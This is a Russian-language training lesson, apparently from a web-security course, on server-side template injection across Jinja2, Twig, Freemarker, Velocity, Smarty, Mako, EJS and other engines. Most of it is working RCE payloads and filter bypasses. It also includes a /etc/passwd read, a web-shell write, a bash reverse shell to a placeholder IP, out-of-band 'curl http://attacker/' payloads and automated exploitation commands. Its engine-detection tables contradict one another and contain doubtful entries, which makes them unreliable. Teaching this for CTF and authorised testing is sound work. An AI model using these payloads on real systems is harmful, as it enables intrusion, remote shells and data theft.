---
id: web-ssti-engines
title: "SSTI по движкам: Jinja2, Twig, Freemarker, Velocity, Handlebars"
category: web
parent: web-ssti-advanced
difficulty: hard
order: 3
tags: [ssti, jinja2, twig, freemarker, velocity, sandbox]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 50
summary: "Определение шаблонизатора и per-engine sandbox escape до RCE: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, EJS, Pebble, Handlebars."
---

SSTI-эксплуатация зависит от **движка шаблонов**: у каждого свой синтаксис, свои объекты и свои пути к RCE. Знание движка превращает «49 в ответе» в рабочий эксплойт. Здесь — практический справочник по основным движкам: как определить, чем платить и как дойти до RCE.

## Теория: определение движка

Отправьте набор «полиглотов» и посмотрите, что вычислится:

```text
{{7*7}}   -> 49 у Twig/Jinja2/Nunjucks (у Jinja2 также {{7*'7'}} -> 7777777)
${7*7}    -> Freemarker/Velocity/JSP-EL/Mako
#{7*7}    -> Ruby/JSP-EL/Thymeleaf
<%= 7*7 %>-> ERB/EJS
%{7*7}    -> Struts2 (OGNL)
{7*7}     -> Smarty (в некоторых контекстах)
```

Отличия: Jinja2 `{{7*'7'}}` → `7777777`, Twig `{{7*'7'}}` → `49`. Freemarker `${7*7}` работает, но `{{7*7}}` — нет.

## Jinja2 (Python/Flask)

Проверка: `{{7*7}}` → 49; `{{7*'7'}}` → `7777777`.

RCE-цепочки:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}                     {# найти subprocess.Popen #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Sandbox-bypass (Flask/Jinja sandbox) — через `__globals__`, `cycler`, `lipsum`, `request`.

## Twig (PHP)

Проверка: `{{7*7}}` → 49; `{{7*'7'}}` → 49.

RCE (Twig < 1.20 / 2.x с уязвимым `_self`):

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id',1]|sort('system')}}
```

Sandboxed Twig сложнее — ищите утечки объектов.

## Freemarker (Java)

Проверка: `${7*7}` → 49.

RCE через `Execute`:

```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign r=ob("java.lang.ProcessBuilder",["id"])>...
```

Современные версии могут блокировать `?new` — ищите другие классы.

## Velocity (Java)

Проверка: `${7*7}` → 49.

RCE через рефлексию:

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
```

## Smarty (PHP)

Проверка: `{$smarty.version}`, `{7*7}`.

RCE:

```smarty
{php}system('id');{/php}        {# старые версии #}
{system('id')}
{Smarty_Internal_Write_File::writeFile('/var/www/shell.php','...')}
```

## Mako (Python)

Проверка: `${7*7}` → 49.

RCE:

```mako
<%! import os %>
${os.popen('id').read()}
${self.module.cache.util.os.system('id')}
```

## EJS / Node

Проверка: `<%= 7*7 %>` → 49.

RCE:

```ejs
<%= process.mainModule.require('child_process').execSync('id') %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

## Pebble (Java)

Проверка: `{{7*7}}`.

RCE (старые версии):

```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime')... %}
```

## Handlebars / Nunjucks (Node)

- **Handlebars:** `{{#with "s" as |string|}}...{{/with}}` — цепочки до `constructor` (при наличии уязвимых хелперов).
- **Nunjucks:** `{{range.constructor("return process.mainModule.require('child_process').execSync('id')")()}}`.

## Разобранный пример: Jinja2 → RCE

Шаг 1 — определяем Jinja2: `{{7*'7'}}` → `7777777`.

Шаг 2 — читаем файл:

```jinja
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

Шаг 3 — RCE:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Шаг 4 — reverse shell: подставьте `bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"`.

## Как определить движок точно

Помимо математики, отправляйте «отпечатки» движков:

| Payload | Jinja2 | Twig | Freemarker | Velocity | Smarty |
|---------|--------|------|------------|----------|--------|
| `{{7*7}}` | 49 | 49 | — | — | — |
| `{{7*'7'}}` | 7777777 | 49 | — | — | — |
| `${7*7}` | — | — | 49 | 49 | — |
| `{# comment #}` | 49 | — | — | — | — |
| `{% debug %}` | info | — | — | — | — |
| `{$smarty.version}` | — | — | — | — | version |

`{{7*'7'}}` — самый быстрый способ отличить Jinja2 от Twig. `${7*7}` указывает на Java-семейство (Freemarker/Velocity) или Mako.

## Инструменты

- **`tplmap`/`SSTImap`** — автоматическое определение и эксплуатация SSTI.
- **`Burp`** + payload-списки — ручной перебор.
- **`{{7*7}}`/`${7*7}`/`#{7*7}`** — стартовые полиглоты.
- **Исходники/`requirements.txt`/`composer.json`** — какой движок реально используется.

## Что дальше / decision

1. Определите движок по отпечаткам.
2. Jinja2/Twig → ищите `__globals__`/`_self`.
3. Java-движки (Freemarker/Velocity) → `Execute`/рефлексия.
4. Есть sandbox → обходите через `cycler`/`lipsum`/утечки объектов.
5. RCE → устойчивый канал + read-back.

## Частые ошибки

- **Путать движки.** Синтаксис/payload разные — определите сначала.
- **Забыть про `7*'7'`.** Различает Jinja2 и Twig.
- **Sandbox есть → сдаваться.** Обходится через `__globals__`/`cycler`.
- **Не проверить версию.** Некоторые payload только для старых версий.
- **Ломать прод.** RCE — только с согласия.

## Универсальная таблица детекта движков

Один и тот же ввод по-разному ведёт себя в разных движках — таблица помогает определить движок за один проход.

| Пейлоад | Jinja2 | Twig | Freemarker | Velocity | Smarty | Mako | EJS |
|---------|--------|------|-----------|----------|--------|------|-----|
| `{{7*7}}` | 49 | 49 | — | — | — | 49 | 49 |
| `{{7*'7'}}` | 7777777 | 49 | — | — | — | — | 7777777 |
| `${7*7}` | — | — | 49 | — | — | — | — |
| `#{7*7}` | — | — | — | 49 | — | — | — |
| `{7*7}` | — | — | — | — | 49 | — | — |
| `<%= 7*7 %>` | — | — | — | — | — | — | 49 |
| `${{7*7}}` | — | — | — | — | — | 49 | — |

```bash
# прогон всех проб через ffuf
ffuf -u 'https://app.example/page?name=FUZZ' -w ssti_probes.txt -mr '49|7777777'
```

Если `{{7*7}}` → `49`, а `{{7*'7'}}` → `7777777` — это Jinja2/Twig (Python/PHP-различие далее по синтаксису).

## Полный RCE по движкам

```python
# Jinja2 (Python) — RCE через MRO
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # ищем subprocess.Popen
```

```php
# Twig (PHP) — RCE (в старых версиях через _self)
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
```

```java
// Freemarker (Java) — Execute utility
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

```java
// Velocity (Java) — Runtime
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()
```

```php
# Smarty (PHP) — {php} или {system}
{system('id')}
```

```python
# Mako (Python)
${self.module.cache.util.os.popen('id').read()}
```

## Слепой SSTI и OOB-детект

Когда вывод не отражается, используйте время или внешние запросы.

```text
# time-based: задержка при исполнении
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}

# OOB: запрос наружу
{{ ''.__class__.__mro__[1].__subclasses__()[X]('curl http://attacker/', shell=True, stdout=-1) }}
${"freemarker.template.utility.Execute"?new()("curl http://attacker/")}
```

Признак blind-SSTI: изменение времени ответа или приход callback.

## Обход фильтров SSTI

| Фильтр | Обход |
|--------|-------|
| блок `{{` | `{%`, `{#`, `${`, `#{}` |
| блок `.` | `['__class__']`, `|attr('__class__')` |
| блок `_` | `request.args.x`, `|attr(request.args.a)` |
| блок ключевых слов | конкатенация строк, `\x5f` |
| блок `os` | `__import__('os')`, `subprocess` |
| блок кавычек | `request.args` / `chr()` |

```text
# Jinja2: без точек и подчёркиваний
{{ (lipsum|attr('__globals__')).os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Инструменты

```bash
# tplmap — автоматический SSTI-эксплуататор
python3 tplmap.py -u 'https://app.example/page?name=*'
# SSTImap — современный аналог
python3 sstimap.py -u 'https://app.example/page?name=*' --os-shell
# nuclei — шаблоны SSTI
nuclei -u https://app.example -tags ssti -j
```

## Что делать дальше / решение

1. **Детект математикой.** Все синтаксисы из таблицы.
2. **Определите движок.** По поведению `7*7` vs `7*'7'`.
3. **Найдите путь к объектам.** MRO/subclasses (Python), utility-классы (Java), filter (PHP).
4. **Обойдите фильтры.** `attr`, `request.args`, конкатенация.
5. **Эксплуатируйте.** Сначала `id`, затем reverse shell.
6. **Зафиксируйте PoC.** Пейлоад + вывод команды.

## Практика и справочники

- **PortSwigger Academy** — «Server-side template injection».
- **HackTricks** — «SSTI».
- **PayloadsAllTheThings** — «SSTI».
- **tplmap / SSTImap** — автоматизация.

## Универсальный алгоритм определения движка

```text
1) {{7*7}}  -> 49?  значит Python/JS-семейство (Jinja2/Twig/Nunjucks/Handlebars)
2) {{7*'7'}} -> 7777777? Jinja2/Nunjucks (Python/Node); -> 49? Twig (PHP)
3) ${7*7}   -> 49?  Java (Freemarker/Velocity) или JS template literal
4) #{7*7}   -> 49?  Ruby (ERB) или Java (Velocity)
5) {7*7}    -> 49?  Smarty (PHP)
6) <%= 7*7 %> -> 49? ERB/EJS
7) ${{7*7}} -> 49?  Mako (Python)
```

```bash
# автоматизация: отправляем пачку проб и смотрим, что вернулось
for p in '{{7*7}}' '{{7*"7"}}' '${7*7}' '#{7*7}' '{7*7}' '<%= 7*7 %>' '${{7*7}}'; do
  r=$(curl -s -G 'https://app.example/page' --data-urlencode "name=$p")
  echo "$p => $(echo "$r" | grep -oE '49|7777777' | head -1)"
done
```

Таблица + этот цикл позволяют точно определить движок за один проход.

## Таблица путей к RCE по движкам

| Движок | Примитив | Класс для RCE |
|--------|----------|---------------|
| Jinja2 | `__globals__`, `__subclasses__` | `subprocess.Popen`, `os` |
| Twig | `_self.env`, `filter` | `system`, `exec` |
| Freemarker | `?new()` | `Execute`, `ObjectConstructor` |
| Velocity | `class.forName` | `Runtime.exec` |
| Smarty | `{php}`/`{system}` | напрямую |
| Mako | `self.module` | `os.popen` |
| EJS | `process` | `child_process` |
| Nunjucks | `range.constructor` | `Function` |

## Итог по SSTI

SSTI — прямой путь к RCE, если шаблон собирается из пользовательского ввода. Алгоритм: детект математикой → определение движка → поиск пути к объектам/утилитам → обход фильтров → выполнение `id` и reverse shell. Даже «безобидное» отражение `{{ }}` в шаблоне без санитизации — это критическая находка.

## Приоритет проверки

SSTI стоит проверять на всех текстовых полях, которые отражаются в ответе: поиск, имена, темы писем, шаблоны уведомлений. Начинайте с математического детекта по всем синтаксисам, затем определите движок по строковой конкатенации, и только потом переходите к RCE-цепочкам. Если ответ не отражается, используйте time-based и OOB-проверки — слепой SSTI встречается не реже прямого.

## Квиз

```quiz
- question: "Какой движок даёт {{7*'7'}} = 7777777?"
  options:
    - "Twig"
    - "Jinja2"
    - "Freemarker"
    - "Velocity"
  answer: 1
  explanation: "Jinja2 (Python) повторяет строку."
- question: "Какой payload характерен для Freemarker?"
  options:
    - "{{7*7}}"
    - "${7*7} и ?new()"
    - "<%= 7*7 %>"
    - "#{7*7}"
  answer: 1
  explanation: "Java Freemarker использует ${} и ?new()."
- question: "Что делает ?new() в Freemarker?"
  options:
    - "Создаёт объект класса (напр. Execute)"
    - "Шифрует"
    - "Кеширует"
    - "Логирует"
  answer: 0
  explanation: "Инстанцирует класс — примитив RCE."
- question: "Как обойти Jinja2 sandbox при блокировке __?"
  options:
    - "Никак"
    - "Через |attr('__class__') и request.application"
    - "Через SQL"
    - "Через cookie"
  answer: 1
  explanation: "attr-фильтр и request дают доступ к globals."
- question: "Какой движок использует <%= %>?"
  options:
    - "Jinja2"
    - "ERB/EJS"
    - "Velocity"
    - "Smarty"
  answer: 1
  explanation: "Ruby ERB и Node EJS."
```

## Где пригодится

- **CTF (Web):** SSTI-задачи на конкретные движки.
- **Bug bounty:** SSTI → RCE — критичный отчёт.
- **Пентест:** аудит шаблонизаторов (email/PDF/отчёты).
- **Работа (AppSec):** sandbox, отсутствие пользовательских шаблонов, обновление движков.
